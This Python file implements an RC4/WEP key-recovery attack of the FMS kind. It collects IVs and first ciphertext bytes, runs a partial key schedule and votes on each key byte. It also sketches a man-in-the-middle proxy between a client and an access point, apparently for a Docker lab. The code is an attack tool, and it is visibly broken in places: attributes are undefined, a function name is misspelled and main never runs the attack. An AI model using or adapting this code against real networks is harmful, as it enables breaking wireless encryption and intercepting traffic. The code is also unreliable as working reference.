import socket
import threading
from pwn import *


# attacker functionality
class Attacker:
    def __init__(self, data):
        # list of IVs and CT[0] values
        self.data = data 


    # swap two values by index in the state array / S-Box
    def swap_by_index(self, S, i, j):
        temp = S[i]
        S[i] = S[j]
        S[j] = temp


    # execute the KSA up to known iterations
    def partial_ksa(self, session_key, A):
        S = list(range(256)) # S-Box in identity permutation
        j = 0
        init_0 = 0
        init_1 = 1
        for i in range(A + 3):
            j = (j + S[i] + session_key[i]) % 256
            self.swap_by_index(S, i, j)
            # if i = 1 record S[0] and S[1] to check later
            if i == 1:
                init_0 = S[0]
                init_1 = S[1]

        return S, j, init_0, init_1


    # format the key and print
    def format_key(self, key):
        # remove the first 3 bytes (IV)
        temp = key[3:]
        formatted = "".join([format(key, 'x') for key in temp])
        log.info(f"Recovered secret key {formatted}")


    # recover the secret key
    def recover_key(self):
        key_len = 4
        session_key = [0] * 3
        # iterate A to the number of bytes we need to recover
        for A in range(key_len):
            prob_table = [0] * 256 # probabaility table for every key byte recovery
            # iterate over every IV, c[0] gathered
            for row in self.data:
                # first 3 bytes of the key are the IV
                session_key[:3] = row[:3]
                # partial execution of the KSA
                S, j, init_0, init_1 = self.partial_ksa(session_key, A)
                z = S[1] # should be 0   
                # check the resolved condition, at A = 0, Z + S[z] = 3 = A + 3
                if z + S[z] == A + 3:
                    # if a swap has distrurbed S[0] or S[1], skip this IV
                    if (init_0 != S[0] or init_1 != S[1]):
                        continue
                    ks_byte = int(row[3]) ^ int(self.snap_hdr, 16) # ct[0] ^ 0xAA
                    # S not completely known when server runs PRGA, bias is no swap of S[0] or S[1] in KSA
                    # ~5% chance S[0] and S[1] never get swapped, allowing inversion of PRGA
                    key_byte = (ks_byte - j - S[A+3]) % 256 # inversion of the PRGA
                    prob_table[key_byte] += 1 # each byte has a frequency counter, increment if resolved condition met
            # get the byte with the highest probability counter - after all IVs have been iterated     
            session_key.append(prob_table.index(max(prob_table)))         

        # format recovered key, remove IV from beginning
        self.format_key(session_key)


# utils class for traffic proxying
class Utils:
    def __init__(self, hosts):
        self.proxy = hosts["attacker"]
        self.ap = hosts["access_point"]
        self.client = hosts["client"]
    
    # target function for the thread(s) that handles a connection
    def handle_conection(self, sock, addr):
        print(f"[+] Thread started, handling {addr}")

    # start the proxy socket
    def start_proxy(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind((self.proxy_host, self.proxy_port))
        # we need to accept 2 connections, one from client, one from access point
        s.listen(2)

        # accept connections
        while True:
            accepted_sock, addr = s.accept()
            connection_thread = threading.Thread(target=handle_connection, args=(accepted_sock, addr)) 
            connection_thread.start()


# main function
def main():
    # if you change the docker networking, change these values
    hosts = {"attacker" : ["172.20.0.3", 4444], "access_point" : ["172.20.0.2", 4444], "client" : ["172.20.0.4", 4444]}
    utils = Utils(hosts)


if __name__ == '__main__':
    main()
